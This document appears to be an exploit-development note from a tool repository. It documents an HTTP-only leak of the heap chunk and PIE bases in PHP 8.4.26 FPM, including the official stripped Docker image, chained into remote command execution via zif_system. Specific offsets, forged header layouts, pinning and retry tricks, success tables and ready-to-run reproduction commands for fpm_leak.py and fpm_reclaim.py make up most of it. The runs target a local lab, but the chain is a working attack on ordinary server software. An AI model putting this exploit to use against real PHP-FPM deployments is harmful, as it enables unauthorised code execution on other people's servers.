# 8M FPM HTTP-only leak (chunk + PIE)

This note covers the last missing piece of the 8M FPM reclaim chain: obtaining
the 2MB **chunk base** and the **PIE base** over HTTP, without gdb, without
`/proc/<pid>/mem`, and without any pre-known absolute address. It closes the
loop started in `fpm-8m-reclaim.md`: leak first, then fire the reclaim
endgame. The same request shapes work on the debug build and on the official
stripped `php:8.4.26-fpm` image.

## Why the whole chunk is available

After the producer OOM the main chunk is completely free
(`free_pages=511`, `free_tail=1`): the stale `BG(unserialize).data` points
into free pages, and the next request allocates from page 1 upwards. The
landing of a `big` text field is therefore a deterministic function of the
pad sizes, which gives a write primitive at chosen offsets inside the chunk.

## Stage 1: chunk base

```text
pads        [7168, 1024]
big size    4096
header      content offset 0x7E8  -> chunk+0x73800 (stale L string)
len         0x15810
read start  chunk+0x73818
```

The forged `zend_string` header overwrites the stale `L` string header; the
reflected session value then reads `0x15810` bytes of the chunk. Heap
pointers in that window are 2MB-aligned by majority vote
(`_find_chunk()`), because their table offset changes with the worker.

`reclaim_pads=[]` + an 8KB field is what puts the endgame buffer at
`chunk+0x6e018`, i.e. `k=0xfe8` above `d=chunk+0x6f000`; the leak fields must
not move `d`, which is why the pads above are used instead of the stock
`[4096, 4096]` / 16KB shapes.

## Stage 2: PIE base

### Debug build (PCRE callback)

```text
pads        []
big size    16384
fake zval   content offset 0x8 -> address 0x72018+8 = 0x72020
            value = chunk+0x1d0, type = 0x106
H           chunk+0x1d0 (chunk header, len = 0xc503)
read start  chunk+0x1e8
PIE pointer read+0x3E38 = pie+0x31d400 (php_pcre_efree)
```

### Official stripped build (handler table)

The official chunk has a 56-byte handler table at `chunk+0x58030`
(10 entries, all `pie+0x7038e0`). It is present on fresh workers **and on
workers respawned after the endgame crash**, which makes it the stable
source. The old single-stage table at `chunk+0x76020`
(`read+0x2808 = pie+0x6a60aa`) only appears on some workers and disappears
after a crash, so `fpm_leak.py` only uses it as a fast path.

```text
pads        []
big size    16384
fake zval   content offset 0x8 -> 0x72020
            value = chunk+0x56c60, type = 0x106
H           chunk+0x56c60 (len = 0x15833)
read start  chunk+0x56c78
PIE pointer read+0x13B8 = chunk+0x58030 = pie+0x7038e0
```

The leaked PIE matched a `/proc` oracle exactly (`0x640e13400000`), and the
stage-1 502 that can happen on a just-restarted or contended child is retried
with a fresh session id.

## Endgame

`src/tools/fpm_reclaim.py --leak` chains the leak into the reclaim endgame:
the 8KB consumer buffer overwrites `d`, the consumer session's `R:2`
resolves to the fake reference/array, and `pDestructor=zif_system` runs the
command at session shutdown. The consumer returns 502 by design; the proof
file is the oracle.

## Proofs

| Build / layout | Result |
|---|---|
| debug 8.4.26 / 8M / 1 worker | **3/3** `uid=33(www-data)` end to end |
| official stripped / 8M / 1 worker | **3/3** `uid=33(www-data)` end to end |
| official stripped / 8M / 4 workers, 3 pinned | **3/3** `uid=33(www-data)` |
| official 8M, endgame with oracle bases | 1/1 `uid=33(www-data)` |

The 4-worker run pins three children with a long-running page
(`labs/fpm/www/pin.php?us=...`) so the leak and the endgame land on the same free
child. Without pinning, a leak request can reach a child that has no stale
decoder state and returns 502.

## Operational notes

- **Separate session ids for leak and endgame.** The endgame consumer crashes
  the worker; reusing its session id makes the next leak answer 502. Leak
  requests use random ids (`session.use_strict_mode=Off` accepts them).
- **The proof directory must exist.** In a container whose entrypoint only
  `chmod`s the webroot, `zif_system("id>out/p1")` can run while the shell
  cannot create `out/p1`. Create `out/` and make it writable before the run,
  otherwise a successful endgame looks like a failure.
- **Header order matters.** `Cookie` must precede `Content-Type`, matching the
  lab pages; otherwise `$_SERVER`/`$_POST` allocation order shifts and the
  big-field landing moves.
- **Geometry is build-specific.** Chunk-relative offsets above are for PHP
  8.4.26 FPM with the lab's request shape; re-measure after changing build,
  page, or field order.

## Reproduce

```bash
python3 src/tools/fpm_leak.py --base http://127.0.0.1:8080 \
  --builder http://127.0.0.1:8081 --profile official
python3 src/tools/fpm_reclaim.py --base http://127.0.0.1:8080 \
  --builder http://127.0.0.1:8081 --zif-offset 0x50a0f0 \
  --leak --leak-profile official --cmd 'id>out/p1' --proof /out/p1
```

See `fpm-8m-reclaim.md` for the producer/consumer mechanism and the 128M
path in `fpm-128m.md`.
